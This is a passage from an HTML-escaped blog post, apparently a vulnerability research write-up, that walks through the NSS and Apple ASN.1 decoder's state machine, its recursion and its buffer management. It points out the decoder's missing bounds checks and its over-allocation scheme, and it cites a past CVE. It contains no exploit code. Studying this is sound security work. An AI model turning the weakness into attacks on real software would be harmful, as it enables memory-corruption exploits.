duringChoice&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; afterChoice&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c2\"&gt;&amp;nbsp; &amp;nbsp; notInUse&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_parse_place&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The state machine loop switches on the &lt;/span&gt;&lt;span class=\"c7\"&gt;place&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field to determine which method to call:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.34b38de34f5f395cb1366034a4fd68d5d626ae2c\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;switch&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;case&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; consumed &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_parse_identifier &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; what &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;SEC_ASN1_Identifier&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;break&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;case&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; consumed &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_parse_more_identifier &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; what &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;SEC_ASN1_Identifier&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;break&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;case&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;afterIdentifier&lt;/span&gt;&lt;span class=\"c1\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; sec_asn1d_confirm_identifier &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;break&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Each state method which could consume input is passed a pointer (&lt;/span&gt;&lt;span class=\"c7\"&gt;buf&lt;/span&gt;&lt;span&gt;) to the next unconsumed byte in the raw input buffer and a count of the remaining unconsumed bytes (&lt;/span&gt;&lt;span class=\"c7\"&gt;len&lt;/span&gt;&lt;span class=\"c9\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;It&amp;#39;s then up to each of those methods to return how much of the input they consumed, and signal any errors by updating the context object&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;status&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The parser can be recursive: a state can set its &lt;/span&gt;&lt;span class=\"c7\"&gt;-&amp;gt;place&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field to a state which expects to handle a parsed child state and then allocate a new child state. For example when parsing an ASN.1 sequence:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.8eeaeea98c81e67701fd5ceeb50d55e628cd74e9\"&gt;&lt;/a&gt;&lt;a id=\"t.7\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringSequence&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; state &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_push_state &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;theTemplate &lt;/span&gt;&lt;span class=\"c1\"&gt;+&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;dest&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;PR_TRUE&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The current state sets its own next state to &lt;/span&gt;&lt;span class=\"c7\"&gt;duringSequence&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_push_state&lt;/span&gt;&lt;span&gt;&amp;nbsp;which allocates a new state object, with a new template and a copy of the parent&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;dest&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c7\"&gt;sec_asn1d_push_state&lt;/span&gt;&lt;span&gt;&amp;nbsp;updates the context&amp;#39;s &lt;/span&gt;&lt;span class=\"c7\"&gt;current&lt;/span&gt;&lt;span&gt;&amp;nbsp;field such that the next loop around &lt;/span&gt;&lt;span class=\"c7\"&gt;SEC_ASN1DecoderUpdate&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;will see this child state as the current state:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4abe94039e6236e075539145b72103a31c4c2c18\"&gt;&lt;/a&gt;&lt;a id=\"t.8\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; cx&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;current &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;new_state&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Note that the initial value of the &lt;/span&gt;&lt;span class=\"c7\"&gt;place&lt;/span&gt;&lt;span&gt;&amp;nbsp;field (which determines the current state) of the newly allocated child is determined by the template. The final state in the state machine path followed by that child will then be responsible for popping itself off the state stack such that the &lt;/span&gt;&lt;span class=\"c7\"&gt;duringSequence&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;state can be reached by its parent to consume the results of the child.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"c32 c8 c15\" id=\"h.wuusy9tj5c7g\"&gt;&lt;span class=\"c31 c28\"&gt;Buffer management&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The buffer management is where the NSS ASN.1 parser starts to get really mind bending. If you read through the code you will notice an extreme lack of bounds checks when the output buffers are being filled in - there basically are none. For example, &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_leaf&lt;/span&gt;&lt;span&gt;&amp;nbsp;which copies the raw encoded string bytes for example simply &lt;/span&gt;&lt;span class=\"c7\"&gt;memcpy&amp;#39;&lt;/span&gt;&lt;span class=\"c9\"&gt;s into the output buffer with no bounds checks that the length of the string matches the size of the buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;Rather than using explicit bounds checks to ensure lengths are valid, the memory safety is instead supposed to be achieved by relying on the fact that decoding valid ASN.1 can never produce output which is larger than its input.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;That is, there are no forms of decompression or input expansion so any parsed output data must be equal to or shorter in length than the input which encoded it. NSS leverages this and over-allocates all output buffers to simply be as large as their inputs.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;For primitive strings this is quite simple: the length and input are provided so there&amp;#39;s nothing really to &lt;/span&gt;&lt;span&gt;go that wrong&lt;/span&gt;&lt;span class=\"c9\"&gt;. But for constructed strings this gets a little fiddly...&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;One way to think of constructed strings is as trees of substrings, nested up to 32-levels deep. Here&amp;#39;s an example:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWnoJoAO5ls05zNgJGzqsN-UTCkUxRl-o1NzXip0CTwvdJOCTXWxYeXnoMWZ47Ndbk0T0AZTcfOhRCGFN8sVbag29apOW4fp-hbZ5RWUsmgdhjcNBhcqqox8S-mGrZL3Lu4nAwpMTJBeStprEvPyqPm7vH84d9IdTRReK-S72A3IGlAPZis6Oj90QS/s706/image3%20%281%29%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWnoJoAO5ls05zNgJGzqsN-UTCkUxRl-o1NzXip0CTwvdJOCTXWxYeXnoMWZ47Ndbk0T0AZTcfOhRCGFN8sVbag29apOW4fp-hbZ5RWUsmgdhjcNBhcqqox8S-mGrZL3Lu4nAwpMTJBeStprEvPyqPm7vH84d9IdTRReK-S72A3IGlAPZis6Oj90QS/s706/image3%20%281%29%281%29.png\" border=\"0\" alt=\"An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker.\" style=\"max-height: 750; max-width: 600px;\" title=\"An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c34 c8 c15\"&gt;&lt;span class=\"c27 c26\"&gt;An outer constructed definite length string with three children: a primitive string &amp;quot;abc&amp;quot;, a constructed indefinite length string and a primitive string &amp;quot;ghi&amp;quot;. The constructed indefinite string has two children, a primitive string &amp;quot;def&amp;quot; and an end-of-contents marker.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;We start with a constructed definite length string. The string&amp;#39;s length value &lt;/span&gt;&lt;span class=\"c7\"&gt;L&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;is the complete size of the remaining input which makes up this string; that number of input bytes should be parsed as substrings and concatenated to form the parsed output.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;At this point the NSS ASN.1 string parser allocates the output buffer for the parsed output string using the length &lt;/span&gt;&lt;span class=\"c7\"&gt;L&lt;/span&gt;&lt;span&gt;&amp;nbsp;of that first input string. This buffer is an over-allocated worst case. The part which makes it really fun though is that NSS allocates the output buffer then promptly throws away that length! This might not be so obvious from quickly glancing through the code though. The buffer which is allocated is stored as the &lt;/span&gt;&lt;span class=\"c7\"&gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field of a buffer wrapper type:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a656829ca34a4322a58a35aea96a9b25f2306e10\"&gt;&lt;/a&gt;&lt;a id=\"t.9\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;typedef&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;struct&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;cssm_data &lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; size_t &lt;/span&gt;&lt;span class=\"c20\"&gt;Length&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; uint8_t &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;__nullable &lt;/span&gt;&lt;span class=\"c20\"&gt;Data&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Item&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c20\"&gt;SecAsn1Oid&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;(Recall that we passed in a pointer to a &lt;/span&gt;&lt;span class=\"c7\"&gt;SecAsn1Item&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the template; it&amp;#39;s the &lt;/span&gt;&lt;span class=\"c30\"&gt;Data&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;field of that which gets filled in with the allocated string buffer pointer here. This type is very slightly different between NSS and Apple&amp;#39;s fork, but the difference doesn&amp;#39;t matter here.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;That &lt;/span&gt;&lt;span class=\"c7\"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is &lt;/span&gt;&lt;span class=\"c17\"&gt;not&lt;/span&gt;&lt;span&gt;&amp;nbsp;the size of the allocated &lt;/span&gt;&lt;span class=\"c7\"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer. It&amp;#39;s a (type-specific) count which determines how many bits or bytes of the buffer pointed to by &lt;/span&gt;&lt;span class=\"c30\"&gt;Data&lt;/span&gt;&lt;span&gt;&amp;nbsp;are valid. I say type-specific because for bit-strings &lt;/span&gt;&lt;span class=\"c7\"&gt;Length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is stored in units of bits but for other strings it&amp;#39;s in units of bytes. (&lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1245528\"&gt;CVE-2016-1950&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;was a bug in NSS where the code mixed up those units.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;Rather than storing the allocated buffer size along with the buffer pointer, each time a substring/child string is encountered the parser walks back up the stack of currently-being-parsed states to find the inner-most definite length string. &lt;/span&gt;&lt;span&gt;As it&amp;#39;s walking up the states it examines each state to determine how much of its input it has consumed in order to be able to determine whether it&amp;#39;s the case that the current to-be-parsed substring is indeed completely enclosed within the inner-most enclosing definite length string.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c9\"&gt;If that sounds complicated, it is! The logic which does this is here, and it took me a good few days to pull it apart enough to figure out what this was doing:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.9b3aa6a323d6b6a86a105c4a1b098ad0fb513030\"&gt;&lt;/a&gt;&lt;a id=\"t.10\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;parent &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;while&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;parent &lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;indefinite&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; parent &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;sec_asn1d_get_enclosing_construct&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;remaining &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;parent &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;do&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(!&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_check_and_subtract_length&lt;/span&gt;&lt;span class=\"c1\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;remaining&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;parent&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;consumed&lt;/span&gt;&lt;span 